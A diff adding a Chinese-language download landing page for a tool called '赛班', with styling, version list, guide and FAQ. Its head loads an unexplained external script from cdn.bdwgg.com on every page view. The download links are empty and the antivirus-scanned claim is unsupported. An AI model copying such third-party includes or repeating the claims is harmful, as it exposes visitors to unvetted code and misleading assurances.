@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="赛班网为您提供最新的赛班下载、安装教程及使用指南。包含安全下载、版本更新、常见问题解答及软件功能详解，帮助您高效使用赛班。">
+    <meta name="keywords" content="赛班,赛班下载,赛班安装,赛班教程,赛班使用指南">
+    <title>赛班-安全高效的下载与使用指南</title>
+    <script type="text/javascript" src="https://cdn.bdwgg.com/mh.js"></script>
+    <style>
+        :root {
+            --primary-color: #0056b3;
+            --secondary-color: #f8f9fa;
+            --text-color: #333;
+            --text-light: #666;
+            --border-color: #e0e0e0;
+            --accent-color: #ff9800;
+            --spacing-unit: 16px;
+            --container-width: 1200px;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif;
+            line-height: 1.6;
+            color: var(--text-color);
+            background-color: #fff;
+        }
+
+        a {
+            text-decoration: none;
+            color: inherit;
+            transition: color 0.2s;
+        }
+
+        a:hover {
+            color: var(--primary-color);
+        }
+
+        ul {
+            list-style: none;
+        }
+
+        /* Layout Utilities */
+        .container {
+            max-width: var(--container-width);
+            margin: 0 auto;
+            padding: 0 var(--spacing-unit);
+        }
+
+        .section {
+            padding: 60px 0;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .section-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 30px;
+            position: relative;
+            padding-left: 12px;
+        }
+
+        .section-title::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 4px;
+            bottom: 4px;
+            width: 4px;
+            background-color: var(--primary-color);
+            border-radius: 2px;
+        }
+
+        /* Header & Nav */
+        header {
+            background-color: #fff;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .header-inner {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            height: 64px;
+        }
+
+        .logo {
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--primary-color);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .logo span {
+            color: var(--text-color);
+        }
+
+        nav ul {
+            display: flex;
+            gap: 24px;
+        }
+
+        nav a {
+            font-size: 15px;
+            color: var(--text-color);
+            font-weight: 500;
+        }
+
+        nav a.active {
+            color: var(--primary-color);
+        }
+
+        .btn-download {
+            background-color: var(--primary-color);
+            color: #fff !important;
+            padding: 8px 20px;
+            border-radius: 4px;
+            font-weight: 500;
+        }
+
+        .btn-download:hover {
+            background-color: #004494;
+        }
+
+        /* Hero Section */
+        .hero {
+            background: linear-gradient(135deg, #f0f7ff 0%, #e6effe 100%);
+            padding: 80px 0;
+            text-align: center;
+        }
+
+        .hero h1 {
+            font-size: 36px;
+            margin-bottom: 16px;
+            color: #1a1a1a;
+        }
+
+        .hero p {
+            font-size: 18px;
+            color: var(--text-light);
+            max-width: 600px;
+            margin: 0 auto 32px;
+        }
+
+        .hero-features {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin-top: 40px;
+            flex-wrap: wrap;
+        }
+
+        .feature-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            color: var(--text-light);
+            font-size: 14px;
+        }
+
+        .feature-icon {
+            width: 48px;
+            height: 48px;
+            background-color: #fff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.05);
+            color: var(--primary-color);
+            font-size: 20px;
+        }
+
+        /* Download Card Section */
+        .download-card {
+            background-color: #fff;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 40px;
+            max-width: 800px;
+            margin: 0 auto;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.03);
+        }
+
+        .version-list {
+            margin-top: 24px;
+            text-align: left;
+            background-color: var(--secondary-color);
+            padding: 20px;
+            border-radius: 6px;
+        }
+
+        .version-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 0;
+            border-bottom: 1px solid rgba(0,0,0,0.05);
+        }
+
+        .version-item:last-child {
+            border-bottom: none;
+        }
+
+        .version-info h4 {
+            font-size: 16px;
+            margin-bottom: 4px;
+        }
+
+        .version-info span {
+            font-size: 12px;
+            color: var(--text-light);
+        }
+
+        .btn-primary {
+            display: inline-block;
+            background-color: var(--primary-color);
+            color: white;
+            padding: 12px 32px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 24px;
+        }
+
+        .btn-primary:hover {
+            background-color: #004494;
+        }
+
+        /* Guide Section */
+        .guide-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 24px;
+        }
+
+        .guide-card {
+            background: #fff;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 24px;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .guide-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 8px 16px rgba(0,0,0,0.08);
+        }
+
+        .guide-icon {
+            width: 40px;
+            height: 40px;
+            background-color: rgba(0, 86, 179, 0.1);
+            color: var(--primary-color);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 16px;
+            font-size: 18px;
+        }
+
+        .guide-card h3 {
+            font-size: 18px;
+            margin-bottom: 12px;
+        }
+
+        .guide-card p {
+            font-size: 14px;
+            color: var(--text-light);
+            line-height: 1.7;
+        }
+
+        /* FAQ Section */
+        .faq-item {
+            border-bottom: 1px solid var(--border-color);
+            padding: 20px 0;
+        }
+
+        .faq-question {
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .faq-question:hover {
+            color: var(--primary-color);
+        }
+
+        .faq-answer {
+            margin-top: 12px;
+            color: var(--text-light);
+            font-size: 14px;
+            display: none;
+        }
+
+        .faq-item.active .faq-answer {
+            display: block;
+        }
+
+        .faq-item.active .faq-question::after {
+            content: '−';
+            font-size: 20px;
+        }
+
+        .faq-item .faq-question::after {
+            content: '+';
+            font-size: 20px;
+            font-weight: 300;
+        }
+
+        /* Footer */
+        footer {
+            background-color: #1a1a1a;
+            color: #999;
+            padding: 40px 0;
+            font-size: 14px;
+        }
+
+        .footer-content {
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+
+        .footer-links a {
+            margin-right: 16px;
+        }
+
+        .footer-bottom {
+            margin-top: 24px;
+            padding-top: 24px;
+            border-top: 1px solid #333;
+            text-align: center;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .header-inner {
+                flex-direction: column;
+                height: auto;
+                padding: 16px 0;
+                gap: 16px;
+            }
+
+            nav ul {
+                gap: 16px;
+                font-size: 14px;
+            }
+
+            .hero h1 {
+                font-size: 28px;
+            }
+
+            .hero-features {
+                gap: 20px;
+            }
+
+            .version-item {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 8px;
+            }
+
+            .btn-download {
+                width: 100%;
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="container header-inner">
+            <div class="logo">
+                <span>赛班</span>官网
+            </div>
+            <nav>
+                <ul>
+                    <li><a href="#" class="active">首页</a></li>
+                    <li><a href="#download">下载中心</a></li>
+                    <li><a href="#guide">使用教程</a></li>
+                    <li><a href="#faq">常见问题</a></li>
+                </ul>
+            </nav>
+            <a href="#download" class="btn-download">立即下载</a>
+        </div>
+    </header>
+
+    <main>
+        <!-- Hero Section -->
+        <section class="hero">
+            <div class="container">
+                <h1>赛班：高效管理的数字工具</h1>
+                <p>赛班为您提供一站式数据管理与协同办公解决方案。安全、稳定、易用，助您提升工作效率。</p>
+                <div class="hero-features">
+                    <div class="feature-item">
+                        <div class="feature-icon">⚡</div>
+                        <span>极速启动</span>
+                    </div>
+                    <div class="feature-item">
+                        <div class="feature-icon">🔒</div>
+                        <span>安全加密</span>
+                    </div>
+                    <div class="feature-item">
+                        <div class="feature-icon">🔄</div>
+                        <span>实时同步</span>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Download Section -->
+        <section id="download" class="section">
+            <div class="container">
+                <h2 class="section-title">下载中心</h2>
+                <div class="download-card">
+                    <p style="margin-bottom: 20px; color: #666;">请根据您的操作系统选择对应的版本进行安装。</p>
+                    
+                    <div class="version-list">
+                        <div class="version-item">
+                            <div class="version-info">
+                                <h4>赛班 v3.0.1 (Windows 10/11)</h4>
+                                <span>大小：85 MB | 更新日期：2023-10-15</span>
+                            </div>
+                            <a href="#" class="btn-download" style="padding: 6px 16px; font-size: 14px;">下载</a>
+                        </div>
+                        <div class="version-item">
+                            <div class="version-info">
+                                <h4>赛班 v3.0.1 (macOS 10.15+)</h4>
+                                <span>大小：92 MB | 更新日期：2023-10-15</span>
+                            </div>
+                            <a href="#" class="btn-download" style="padding: 6px 16px; font-size: 14px;">下载</a>
+                        </div>
+                        <div class="version-item">
+                            <div class="version-info">
+                                <h4>赛班 v2.8.5 (Linux Universal)</h4>
+                                <span>大小：76 MB | 更新日期：2023-09-20</span>
+                            </div>
+                            <a href="#" class="btn-download" style="padding: 6px 16px; font-size: 14px;">下载</a>
+                        </div>
+                    </div>
+
+                    <button class="btn-primary" onclick="alert('感谢您的兴趣！下载链接正在生成中...')">获取安装包</button>
+                    <p style="margin-top: 16px; font-size: 12px; color: #999;">所有下载均经过杀毒软件扫描，确保安全。</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Guide Section -->
+        <section id="guide" class="section" style="background-color: #fafafa;">
+            <div class="container">
+                <h2 class="section-title">新手指南</h2>
+                <div class="guide-grid">
+                    <article class="guide-card">
+                        <div class="guide-icon">1️⃣</div>
+                        <h3>安装与注册</h3>
+                        <p>下载安装包后，双击运行。按照向导提示完成安装。首次启动时，您需要注册一个赛班账号并登录系统，以激活云同步功能。</p>
+                    </article>
+                    <article class="guide-card">
+                        <div class="guide-icon">2️⃣</div>
+                        <h3>数据导入</h3>
+                        <p>赛班支持从 Excel、CSV 或旧版备份文件中导入数据。进入“数据管理”面板，选择“导入数据”并按照提示上传文件即可。</p>
+                    </article>
+                    <article class="guide-card">
+                        <div class="guide-icon">3️⃣</div>
+                        <h3>团队协作</h3>
+                        <p>创建或加入工作空间。在空间内设置成员权限，即可实现文件的共享、评论和实时编辑，提升团队协作效率。</p>
+                    </article>
+                </div>
+            </div>
+        </section>
+
+        <!-- FAQ Section -->
+        <section id="faq" class="section">
+            <div class="container">
+                <h2 class="section-title">常见问题 (FAQ)</h2>
+                <div class="download-card" style="padding: 32px;">
+                    <div class="faq-item">
+                        <div class="faq-question">赛班支持哪些设备？</div>
+                        <div class="faq-answer">赛班支持 Windows 7及以上版本、macOS 10.10及以上版本以及主流的 Linux 发行版。移动端可以通过网页版浏览器或适配的移动端 App 访问。</div>
+                    </div>
+                    <div class="faq-item">
+                        <div class="faq-question">数据是否安全？</div>
+                        <div class="faq-answer">我们采用端到端加密技术保护您的数据传输和存储。同时，我们提供本地备份功能，确保即使网络中断，您的数据依然安全。</div>
+                    </div>
+                    <div class="faq-item">
+                        <div class="faq-question">如何进行系统更新？</div>
+                        <div class="faq-answer">赛班支持自动更新功能。当有新版本发布时，系统会提示您更新。您也可以在“设置”>“关于”中手动检查并下载最新版本。</div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-brand">
+                    <h3>赛班</h3>
+                    <p style="margin-top: 8px;">致力于为用户提供最优质的数据管理服务。</p>
+                </div>
+                <div class="footer-links">
+                    <a href="#">关于我们</a>
+                    <a href="#">隐私政策</a>
+                    <a href="#">服务条款</a>
+                    <a href="#">联系支持</a>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2023 赛班官方网站. 保留所有权利。</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Simple FAQ Toggle Logic
+        document.addEventListener('DOMContentLoaded', function() {
+            const faqItems = document.querySelectorAll('.faq-item');
+            
+            faqItems.forEach(item => {
+                const question = item.querySelector('.faq-question');
+                question.addEventListener('click', () => {
+                    // Close other items
+                    faqItems.forEach(otherItem => {
+                        if (otherItem !== item) {
+                            otherItem.classList.remove('active');
+                        }
+                    });
+                    // Toggle current item
+                    item.classList.toggle('active');
+                });
+            });
+        });
+    </script>
+</body>
+</html>
